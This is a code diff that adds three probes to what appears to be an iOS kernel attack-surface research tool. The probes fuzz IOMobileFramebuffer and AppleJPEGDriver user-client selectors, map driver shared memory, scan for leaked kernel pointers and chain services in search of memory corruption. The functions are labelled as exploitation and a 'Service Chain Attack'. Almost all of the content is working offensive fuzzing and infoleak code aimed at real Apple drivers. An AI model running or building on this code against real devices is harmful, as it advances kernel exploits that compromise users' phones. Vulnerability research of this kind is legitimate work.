@@ -16307,3 +16307,646 @@ void iosurface_research_gpu_dma_race(ISRLogBlock _Nonnull log, ISRDoneBlock _Non
         done(res);
     });
 }
+
+#pragma mark - Round 25: Deep Service Exploitation
+
+// Probe 76: IOMobileFramebuffer Deep
+void iosurface_research_fb_deep(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }
+
+        log(@"FBDEEP: === Probe 76: IOMobileFramebuffer Deep Fuzz ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int accepted = 0, nonZeroOutputs = 0, mappedRegions = 0, anomalies = 0;
+        io_connect_t conn = 0;
+
+        IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(64, 64));
+        IOSurfaceID surfID = surf ? sym.getID(surf) : 0;
+
+        if (!surf) {
+            log(@"FBDEEP: Failed to create surface");
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"anomalies": @0});
+            return;
+        }
+
+        log([NSString stringWithFormat:@"FBDEEP: Created surface ID=%u allocSize=%zu", surfID, sym.getAllocSize(surf)]);
+
+        // Open IOMobileFramebuffer type 4
+        if (!isr_stopped()) {
+            CFMutableDictionaryRef matchDict = sym.matching("IOMobileFramebuffer");
+            if (matchDict) {
+                io_service_t svc = sym.getMatch(MACH_PORT_NULL, matchDict);
+                if (svc) {
+                    kern_return_t kr = sym.open(svc, mach_task_self(), 4, &conn);
+                    if (kr == KERN_SUCCESS && conn) {
+                        log([NSString stringWithFormat:@"FBDEEP: Opened IOMobileFramebuffer type=4 conn=%u", conn]);
+                    } else {
+                        log([NSString stringWithFormat:@"FBDEEP: Failed to open type=4 kr=0x%x", kr]);
+                        conn = 0;
+                    }
+                    sym.release(svc);
+                } else {
+                    log(@"FBDEEP: IOMobileFramebuffer service not found");
+                }
+            }
+        }
+
+        // Phase 1: Deep fuzz selectors 70-99 with varied inputs
+        if (!isr_stopped() && conn) {
+            log(@"FBDEEP: Phase 1 — Deep selector fuzzing 70-99");
+            for (uint32_t sel = 70; sel < 100 && !isr_stopped(); sel++) {
+                // Test A: Scalar with surface ID
+                uint64_t scalarIn[2] = {surfID, 0xDEADBEEF};
+                uint64_t scalarOut[4] = {0};
+                uint32_t scalarOutCnt = 4;
+                kern_return_t kr = sym.call(conn, sel, scalarIn, 2, NULL, 0,
+                                            scalarOut, &scalarOutCnt, NULL, NULL);
+                if (kr == KERN_SUCCESS) {
+                    accepted++;
+                    BOOL hasOutput = NO;
+                    for (int i = 0; i < (int)scalarOutCnt; i++) {
+                        if (scalarOut[i] != 0) { hasOutput = YES; break; }
+                    }
+                    if (hasOutput) {
+                        nonZeroOutputs++;
+                        log([NSString stringWithFormat:@"FBDEEP: sel=%u ACCEPTED scalar out=[0x%llx,0x%llx,0x%llx,0x%llx]",
+                             sel, scalarOut[0], scalarOut[1], scalarOut[2], scalarOut[3]]);
+                    }
+                }
+
+                // Test B: 64-byte struct with surface ID at offset 0
+                uint8_t structIn64[64];
+                memset(structIn64, 0, sizeof(structIn64));
+                memcpy(structIn64, &surfID, sizeof(surfID));
+                uint8_t structOut[256];
+                memset(structOut, 0, sizeof(structOut));
+                size_t structOutSize = sizeof(structOut);
+                kr = sym.call(conn, sel, NULL, 0, structIn64, sizeof(structIn64),
+                              NULL, NULL, structOut, &structOutSize);
+                if (kr == KERN_SUCCESS) {
+                    accepted++;
+                    BOOL hasData = NO;
+                    for (size_t i = 0; i < structOutSize && i < 256; i++) {
+                        if (structOut[i] != 0) { hasData = YES; break; }
+                    }
+                    if (hasData) {
+                        nonZeroOutputs++;
+                        uint64_t first8 = 0;
+                        memcpy(&first8, structOut, sizeof(first8));
+                        log([NSString stringWithFormat:@"FBDEEP: sel=%u struct64 outSize=%zu first8=0x%llx",
+                             sel, structOutSize, first8]);
+                        // Check for kernel pointer patterns
+                        for (size_t i = 0; i + 8 <= structOutSize; i += 8) {
+                            uint64_t val = 0;
+                            memcpy(&val, structOut + i, 8);
+                            if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                                anomalies++;
+                                log([NSString stringWithFormat:@"FBDEEP: KERNEL PTR at out+%zu = 0x%llx", i, val]);
+                            }
+                        }
+                    }
+                }
+
+                // Test C: 256-byte struct with surface ID at multiple offsets
+                uint8_t structIn256[256];
+                memset(structIn256, 0, sizeof(structIn256));
+                memcpy(structIn256, &surfID, sizeof(surfID));
+                memcpy(structIn256 + 32, &surfID, sizeof(surfID));
+                memcpy(structIn256 + 64, &surfID, sizeof(surfID));
+                uint64_t marker = 0xDEADBEEFCAFEBABEULL;
+                memcpy(structIn256 + 8, &marker, 8);
+                structOutSize = sizeof(structOut);
+                memset(structOut, 0, sizeof(structOut));
+                kr = sym.call(conn, sel, NULL, 0, structIn256, sizeof(structIn256),
+                              NULL, NULL, structOut, &structOutSize);
+                if (kr == KERN_SUCCESS && structOutSize > 0) {
+                    accepted++;
+                    BOOL hasData = NO;
+                    for (size_t i = 0; i < structOutSize && i < 256; i++) {
+                        if (structOut[i] != 0) { hasData = YES; break; }
+                    }
+                    if (hasData) {
+                        nonZeroOutputs++;
+                        log([NSString stringWithFormat:@"FBDEEP: sel=%u struct256 outSize=%zu", sel, structOutSize]);
+                    }
+                }
+            }
+            log([NSString stringWithFormat:@"FBDEEP: Phase 1 done — accepted=%d nonZeroOutputs=%d", accepted, nonZeroOutputs]);
+        }
+
+        // Phase 2: IOConnectMapMemory64 types 0-15
+        if (!isr_stopped() && conn) {
+            log(@"FBDEEP: Phase 2 — IOConnectMapMemory64 types 0-15");
+            typedef kern_return_t (*MapMem64Fn)(io_connect_t, uint32_t, task_t,
+                                                 mach_vm_address_t *, mach_vm_size_t *, uint32_t);
+            MapMem64Fn mapMem = (MapMem64Fn)dlsym(sym.iokit, "IOConnectMapMemory64");
+            if (mapMem) {
+                for (uint32_t memType = 0; memType < 16 && !isr_stopped(); memType++) {
+                    mach_vm_address_t addr = 0;
+                    mach_vm_size_t size = 0;
+                    kern_return_t kr = mapMem(conn, memType, mach_task_self(), &addr, &size, 1);
+                    if (kr == KERN_SUCCESS && addr != 0 && size > 0) {
+                        mappedRegions++;
+                        log([NSString stringWithFormat:@"FBDEEP: MAPPED type=%u addr=0x%llx size=%llu", memType, addr, size]);
+                        // Scan mapped memory for kernel pointers
+                        for (mach_vm_size_t off = 0; off + 8 <= size && off < 4096; off += 8) {
+                            uint64_t val = 0;
+                            memcpy(&val, (void *)(uintptr_t)(addr + off), 8);
+                            if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                                anomalies++;
+                                log([NSString stringWithFormat:@"FBDEEP: MAP KERNEL PTR at type%u+%llu = 0x%llx", memType, off, val]);
+                            }
+                        }
+                    }
+                }
+            } else {
+                log(@"FBDEEP: IOConnectMapMemory64 not available");
+            }
+            log([NSString stringWithFormat:@"FBDEEP: Phase 2 done — mappedRegions=%d", mappedRegions]);
+        }
+
+        if (conn) sym.close(conn);
+        CFRelease(surf);
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"FBDEEP: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"FBDEEP: accepted=%d nonZeroOutputs=%d mappedRegions=%d anomalies=%d",
+             accepted, nonZeroOutputs, mappedRegions, anomalies]);
+
+        NSString *verdict;
+        if (anomalies > 0) verdict = @"CRITICAL — kernel pointer leak or memory mapping detected";
+        else if (mappedRegions > 0) verdict = @"HIGH — shared memory mapped from framebuffer driver";
+        else if (nonZeroOutputs > 0) verdict = @"MEDIUM — selectors return non-zero data";
+        else if (accepted > 0) verdict = @"LOW — selectors accepted but no useful output";
+        else verdict = @"LOW — no selectors accepted on type 4";
+        log([NSString stringWithFormat:@"FBDEEP: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"accepted": @(accepted),
+            @"nonZeroOutputs": @(nonZeroOutputs),
+            @"mappedRegions": @(mappedRegions)
+        };
+        isr_checkpoint(@"ISR-FBDeep-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+// Probe 77: AppleJPEGDriver Exploit
+void iosurface_research_jpeg_exploit(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }
+
+        log(@"JPEGEXP: === Probe 77: AppleJPEGDriver Exploit ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int totalAccepted = 0, nonZeroOutputs = 0, mappedRegions = 0, anomalies = 0;
+        int connectionsOpened = 0;
+
+        IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(64, 64));
+        IOSurfaceID surfID = surf ? sym.getID(surf) : 0;
+
+        if (!surf) {
+            log(@"JPEGEXP: Failed to create surface");
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"anomalies": @0});
+            return;
+        }
+
+        log([NSString stringWithFormat:@"JPEGEXP: Created surface ID=%u", surfID]);
+
+        // Open AppleJPEGDriver on all 5 connection types
+        io_connect_t conns[5] = {0};
+        CFMutableDictionaryRef matchDict = sym.matching("AppleJPEGDriver");
+        io_service_t svc = 0;
+        if (matchDict) {
+            svc = sym.getMatch(MACH_PORT_NULL, matchDict);
+        }
+
+        if (!svc) {
+            log(@"JPEGEXP: AppleJPEGDriver service not found");
+            CFRelease(surf);
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"anomalies": @0, @"verdict": @"LOW — service not found"});
+            return;
+        }
+
+        for (uint32_t t = 0; t < 5 && !isr_stopped(); t++) {
+            kern_return_t kr = sym.open(svc, mach_task_self(), t, &conns[t]);
+            if (kr == KERN_SUCCESS && conns[t]) {
+                connectionsOpened++;
+                log([NSString stringWithFormat:@"JPEGEXP: Opened type=%u conn=%u", t, conns[t]]);
+            } else {
+                conns[t] = 0;
+            }
+        }
+        sym.release(svc);
+
+        log([NSString stringWithFormat:@"JPEGEXP: Opened %d/5 connection types", connectionsOpened]);
+
+        // Phase 1: Fuzz selectors 0-49 on each connection
+        if (!isr_stopped()) {
+            log(@"JPEGEXP: Phase 1 — Selector fuzzing 0-49 on all types");
+            for (int t = 0; t < 5 && !isr_stopped(); t++) {
+                if (!conns[t]) continue;
+                int typeAccepted = 0;
+
+                for (uint32_t sel = 0; sel < 50 && !isr_stopped(); sel++) {
+                    // Test A: Empty input
+                    uint64_t scalarOut[4] = {0};
+                    uint32_t scalarOutCnt = 4;
+                    kern_return_t kr = sym.call(conns[t], sel, NULL, 0, NULL, 0,
+                                                scalarOut, &scalarOutCnt, NULL, NULL);
+                    if (kr == KERN_SUCCESS) {
+                        typeAccepted++;
+                        totalAccepted++;
+                    }
+
+                    // Test B: Surface ID as scalar
+                    uint64_t scalarIn[1] = {surfID};
+                    scalarOutCnt = 4;
+                    memset(scalarOut, 0, sizeof(scalarOut));
+                    kr = sym.call(conns[t], sel, scalarIn, 1, NULL, 0,
+                                  scalarOut, &scalarOutCnt, NULL, NULL);
+                    if (kr == KERN_SUCCESS) {
+                        totalAccepted++;
+                        for (int i = 0; i < (int)scalarOutCnt; i++) {
+                            if (scalarOut[i] != 0) {
+                                nonZeroOutputs++;
+                                log([NSString stringWithFormat:@"JPEGEXP: type=%d sel=%u scalar out[%d]=0x%llx", t, sel, i, scalarOut[i]]);
+                                break;
+                            }
+                        }
+                    }
+
+                    // Test C: Struct with JPEG SOI marker + surface ID
+                    uint8_t jpegStruct[128];
+                    memset(jpegStruct, 0, sizeof(jpegStruct));
+                    jpegStruct[0] = 0xFF; jpegStruct[1] = 0xD8; // SOI
+                    jpegStruct[2] = 0xFF; jpegStruct[3] = 0xE0; // APP0
+                    memcpy(jpegStruct + 8, &surfID, sizeof(surfID));
+                    uint64_t dims = ((uint64_t)64 << 32) | 64;
+                    memcpy(jpegStruct + 16, &dims, 8);
+
+                    uint8_t structOut[256];
+                    memset(structOut, 0, sizeof(structOut));
+                    size_t structOutSize = sizeof(structOut);
+                    kr = sym.call(conns[t], sel, NULL, 0, jpegStruct, sizeof(jpegStruct),
+                                  NULL, NULL, structOut, &structOutSize);
+                    if (kr == KERN_SUCCESS && structOutSize > 0) {
+                        totalAccepted++;
+                        BOOL hasData = NO;
+                        for (size_t i = 0; i < structOutSize && i < 256; i++) {
+                            if (structOut[i] != 0) { hasData = YES; break; }
+                        }
+                        if (hasData) {
+                            nonZeroOutputs++;
+                            log([NSString stringWithFormat:@"JPEGEXP: type=%d sel=%u jpeg struct outSize=%zu", t, sel, structOutSize]);
+                            // Scan for kernel pointers
+                            for (size_t i = 0; i + 8 <= structOutSize; i += 8) {
+                                uint64_t val = 0;
+                                memcpy(&val, structOut + i, 8);
+                                if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                                    anomalies++;
+                                    log([NSString stringWithFormat:@"JPEGEXP: KERNEL PTR type=%d sel=%u offset=%zu val=0x%llx", t, sel, i, val]);
+                                }
+                            }
+                        }
+                    }
+                }
+                if (typeAccepted > 0) {
+                    log([NSString stringWithFormat:@"JPEGEXP: type=%d accepted=%d selectors", t, typeAccepted]);
+                }
+            }
+        }
+
+        // Phase 2: IOConnectMapMemory64 on each connection
+        if (!isr_stopped()) {
+            log(@"JPEGEXP: Phase 2 — IOConnectMapMemory64 on each type");
+            typedef kern_return_t (*MapMem64Fn)(io_connect_t, uint32_t, task_t,
+                                                 mach_vm_address_t *, mach_vm_size_t *, uint32_t);
+            MapMem64Fn mapMem = (MapMem64Fn)dlsym(sym.iokit, "IOConnectMapMemory64");
+            if (mapMem) {
+                for (int t = 0; t < 5 && !isr_stopped(); t++) {
+                    if (!conns[t]) continue;
+                    for (uint32_t memType = 0; memType < 8; memType++) {
+                        mach_vm_address_t addr = 0;
+                        mach_vm_size_t size = 0;
+                        kern_return_t kr = mapMem(conns[t], memType, mach_task_self(), &addr, &size, 1);
+                        if (kr == KERN_SUCCESS && addr != 0 && size > 0) {
+                            mappedRegions++;
+                            log([NSString stringWithFormat:@"JPEGEXP: MAPPED type=%d memType=%u addr=0x%llx size=%llu", t, memType, addr, size]);
+                            for (mach_vm_size_t off = 0; off + 8 <= size && off < 4096; off += 8) {
+                                uint64_t val = 0;
+                                memcpy(&val, (void *)(uintptr_t)(addr + off), 8);
+                                if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                                    anomalies++;
+                                    log([NSString stringWithFormat:@"JPEGEXP: MAP PTR type=%d mem=%u off=%llu val=0x%llx", t, memType, off, val]);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        for (int t = 0; t < 5; t++) {
+            if (conns[t]) sym.close(conns[t]);
+        }
+        CFRelease(surf);
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"JPEGEXP: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"JPEGEXP: connections=%d accepted=%d outputs=%d mapped=%d anomalies=%d",
+             connectionsOpened, totalAccepted, nonZeroOutputs, mappedRegions, anomalies]);
+
+        NSString *verdict;
+        if (anomalies > 0) verdict = @"CRITICAL — kernel pointer leak from JPEG driver";
+        else if (mappedRegions > 0) verdict = @"HIGH — shared memory mapped from JPEG driver";
+        else if (nonZeroOutputs > 0) verdict = @"MEDIUM — selectors return data with surface IDs";
+        else if (totalAccepted > 0) verdict = @"LOW — selectors accepted but no useful output";
+        else verdict = @"LOW — no selectors accepted";
+        log([NSString stringWithFormat:@"JPEGEXP: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"connections": @(connectionsOpened),
+            @"accepted": @(totalAccepted),
+            @"nonZeroOutputs": @(nonZeroOutputs),
+            @"mappedRegions": @(mappedRegions)
+        };
+        isr_checkpoint(@"ISR-JPEGExploit-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+// Probe 78: Service Chain
+void iosurface_research_service_chain(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        ISRSymbols sym;
+        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }
+
+        log(@"SVCCHAIN: === Probe 78: Service Chain Attack ===");
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+
+        int surfModifications = 0, outputData = 0, crossEffects = 0, anomalies = 0;
+        io_connect_t fbConn = 0;
+        io_connect_t jpegConns[5] = {0};
+        int jpegOpened = 0;
+
+        // Create surface with sentinel pattern
+        IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(64, 64));
+        if (!surf) {
+            log(@"SVCCHAIN: Failed to create surface");
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"anomalies": @0});
+            return;
+        }
+        IOSurfaceID surfID = sym.getID(surf);
+        size_t allocSize = sym.getAllocSize(surf);
+
+        // Write sentinel pattern
+        sym.lock(surf, 0, NULL);
+        void *base = sym.getBase(surf);
+        if (base) {
+            uint32_t sentinel = 0xCAFEBABE;
+            for (size_t off = 0; off < allocSize; off += 4) {
+                memcpy((uint8_t *)base + off, &sentinel, 4);
+            }
+        }
+        sym.unlock(surf, 0, NULL);
+        log([NSString stringWithFormat:@"SVCCHAIN: Surface ID=%u size=%zu sentinel=0xCAFEBABE", surfID, allocSize]);
+
+        // Open IOMobileFramebuffer type 4
+        if (!isr_stopped()) {
+            CFMutableDictionaryRef md = sym.matching("IOMobileFramebuffer");
+            if (md) {
+                io_service_t svc = sym.getMatch(MACH_PORT_NULL, md);
+                if (svc) {
+                    kern_return_t kr = sym.open(svc, mach_task_self(), 4, &fbConn);
+                    if (kr != KERN_SUCCESS) fbConn = 0;
+                    else log([NSString stringWithFormat:@"SVCCHAIN: FB conn=%u", fbConn]);
+                    sym.release(svc);
+                }
+            }
+        }
+
+        // Open AppleJPEGDriver all types
+        if (!isr_stopped()) {
+            CFMutableDictionaryRef md = sym.matching("AppleJPEGDriver");
+            if (md) {
+                io_service_t svc = sym.getMatch(MACH_PORT_NULL, md);
+                if (svc) {
+                    for (uint32_t t = 0; t < 5; t++) {
+                        kern_return_t kr = sym.open(svc, mach_task_self(), t, &jpegConns[t]);
+                        if (kr == KERN_SUCCESS && jpegConns[t]) jpegOpened++;
+                        else jpegConns[t] = 0;
+                    }
+                    sym.release(svc);
+                    log([NSString stringWithFormat:@"SVCCHAIN: JPEG connections=%d", jpegOpened]);
+                }
+            }
+        }
+
+        // Phase 1: Pass surface to IOMobileFramebuffer selectors 78-79
+        if (!isr_stopped() && fbConn) {
+            log(@"SVCCHAIN: Phase 1 — FB selectors 78-79 with surface ID");
+            for (uint32_t sel = 78; sel <= 79 && !isr_stopped(); sel++) {
+                // Struct with surface ID at offset 0 and 32
+                uint8_t structIn[128];
+                memset(structIn, 0, sizeof(structIn));
+                memcpy(structIn, &surfID, sizeof(surfID));
+                memcpy(structIn + 32, &surfID, sizeof(surfID));
+                uint64_t surfIDu64 = surfID;
+                memcpy(structIn + 8, &surfIDu64, 8);
+
+                uint8_t structOut[256];
+                memset(structOut, 0, sizeof(structOut));
+                size_t outSize = sizeof(structOut);
+                uint64_t scalarOut[4] = {0};
+                uint32_t scalarOutCnt = 4;
+
+                kern_return_t kr = sym.call(fbConn, sel, &surfIDu64, 1, structIn, sizeof(structIn),
+                                            scalarOut, &scalarOutCnt, structOut, &outSize);
+                log([NSString stringWithFormat:@"SVCCHAIN: FB sel=%u kr=0x%x outSize=%zu scalarOut=[0x%llx,0x%llx]",
+                     sel, kr, outSize, scalarOut[0], scalarOut[1]]);
+
+                if (kr == KERN_SUCCESS) {
+                    for (int i = 0; i < (int)scalarOutCnt; i++) {
+                        if (scalarOut[i] != 0) { outputData++; break; }
+                    }
+                    for (size_t i = 0; i + 8 <= outSize; i += 8) {
+                        uint64_t val = 0;
+                        memcpy(&val, structOut + i, 8);
+                        if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                            anomalies++;
+                            log([NSString stringWithFormat:@"SVCCHAIN: FB KERNEL PTR sel=%u off=%zu val=0x%llx", sel, i, val]);
+                        }
+                    }
+                }
+
+                // Check if surface was modified
+                sym.lock(surf, 1, NULL);
+                void *b = sym.getBase(surf);
+                if (b) {
+                    uint32_t first4 = 0;
+                    memcpy(&first4, b, 4);
+                    if (first4 != 0xCAFEBABE) {
+                        surfModifications++;
+                        log([NSString stringWithFormat:@"SVCCHAIN: SURFACE MODIFIED after FB sel=%u! first4=0x%08x", sel, first4]);
+                    }
+                }
+                sym.unlock(surf, 1, NULL);
+            }
+        }
+
+        // Phase 2: Pass surface to AppleJPEGDriver on all types
+        if (!isr_stopped()) {
+            log(@"SVCCHAIN: Phase 2 — JPEG driver with surface ID");
+            for (int t = 0; t < 5 && !isr_stopped(); t++) {
+                if (!jpegConns[t]) continue;
+                for (uint32_t sel = 0; sel < 20 && !isr_stopped(); sel++) {
+                    uint8_t structIn[128];
+                    memset(structIn, 0, sizeof(structIn));
+                    structIn[0] = 0xFF; structIn[1] = 0xD8;
+                    structIn[2] = 0xFF; structIn[3] = 0xE0;
+                    memcpy(structIn + 8, &surfID, sizeof(surfID));
+
+                    uint8_t structOut[256];
+                    memset(structOut, 0, sizeof(structOut));
+                    size_t outSize = sizeof(structOut);
+                    kern_return_t kr = sym.call(jpegConns[t], sel, NULL, 0, structIn, sizeof(structIn),
+                                                NULL, NULL, structOut, &outSize);
+                    if (kr == KERN_SUCCESS && outSize > 0) {
+                        BOOL hasData = NO;
+                        for (size_t i = 0; i < outSize && i < 256; i++) {
+                            if (structOut[i] != 0) { hasData = YES; break; }
+                        }
+                        if (hasData) {
+                            outputData++;
+                            log([NSString stringWithFormat:@"SVCCHAIN: JPEG type=%d sel=%u outSize=%zu", t, sel, outSize]);
+                        }
+                    }
+                }
+
+                // Check surface after each type
+                sym.lock(surf, 1, NULL);
+                void *b = sym.getBase(surf);
+                if (b) {
+                    uint32_t first4 = 0;
+                    memcpy(&first4, b, 4);
+                    if (first4 != 0xCAFEBABE) {
+                        surfModifications++;
+                        log([NSString stringWithFormat:@"SVCCHAIN: SURFACE MODIFIED after JPEG type=%d! first4=0x%08x", t, first4]);
+                    }
+                }
+                sym.unlock(surf, 1, NULL);
+            }
+        }
+
+        // Phase 3: Cross-service chain — FB then JPEG
+        if (!isr_stopped() && fbConn && jpegOpened > 0) {
+            log(@"SVCCHAIN: Phase 3 — Cross-service chain");
+            // Re-write sentinel
+            sym.lock(surf, 0, NULL);
+            base = sym.getBase(surf);
+            if (base) {
+                uint32_t sentinel = 0xBEEFDEAD;
+                for (size_t off = 0; off < allocSize; off += 4) {
+                    memcpy((uint8_t *)base + off, &sentinel, 4);
+                }
+            }
+            sym.unlock(surf, 0, NULL);
+
+            // Call FB sel 78
+            uint64_t scIn = surfID;
+            uint8_t sIn[64];
+            memset(sIn, 0, sizeof(sIn));
+            memcpy(sIn, &surfID, sizeof(surfID));
+            sym.call(fbConn, 78, &scIn, 1, sIn, sizeof(sIn), NULL, NULL, NULL, NULL);
+
+            // Then call JPEG on all types
+            for (int t = 0; t < 5; t++) {
+                if (!jpegConns[t]) continue;
+                uint8_t jIn[64];
+                memset(jIn, 0, sizeof(jIn));
+                memcpy(jIn, &surfID, sizeof(surfID));
+                uint8_t jOut[256];
+                memset(jOut, 0, sizeof(jOut));
+                size_t jOutSize = sizeof(jOut);
+                kern_return_t kr = sym.call(jpegConns[t], 0, NULL, 0, jIn, sizeof(jIn),
+                                            NULL, NULL, jOut, &jOutSize);
+                if (kr == KERN_SUCCESS && jOutSize > 0) {
+                    for (size_t i = 0; i + 8 <= jOutSize; i += 8) {
+                        uint64_t val = 0;
+                        memcpy(&val, jOut + i, 8);
+                        if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                            crossEffects++;
+                            log([NSString stringWithFormat:@"SVCCHAIN: CROSS-SVC PTR type=%d off=%zu val=0x%llx", t, i, val]);
+                        }
+                    }
+                }
+            }
+
+            // Final surface check
+            sym.lock(surf, 1, NULL);
+            base = sym.getBase(surf);
+            if (base) {
+                uint32_t first4 = 0;
+                memcpy(&first4, base, 4);
+                if (first4 != 0xBEEFDEAD) {
+                    crossEffects++;
+                    log([NSString stringWithFormat:@"SVCCHAIN: CROSS-SVC surface MODIFIED! first4=0x%08x", first4]);
+                }
+            }
+            sym.unlock(surf, 1, NULL);
+        }
+
+        if (fbConn) sym.close(fbConn);
+        for (int t = 0; t < 5; t++) {
+            if (jpegConns[t]) sym.close(jpegConns[t]);
+        }
+        CFRelease(surf);
+
+        anomalies += surfModifications + crossEffects;
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"SVCCHAIN: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"SVCCHAIN: surfMod=%d outputData=%d crossEffects=%d anomalies=%d",
+             surfModifications, outputData, crossEffects, anomalies]);
+
+        NSString *verdict;
+        if (crossEffects > 0) verdict = @"CRITICAL — cross-service memory corruption detected";
+        else if (surfModifications > 0) verdict = @"HIGH — service modified IOSurface backing memory";
+        else if (outputData > 0) verdict = @"MEDIUM — services return data with surface IDs";
+        else verdict = @"LOW — no cross-service effects detected";
+        log([NSString stringWithFormat:@"SVCCHAIN: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"surfModifications": @(surfModifications),
+            @"outputData": @(outputData),
+            @"crossEffects": @(crossEffects)
+        };
+        isr_checkpoint(@"ISR-ServiceChain-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
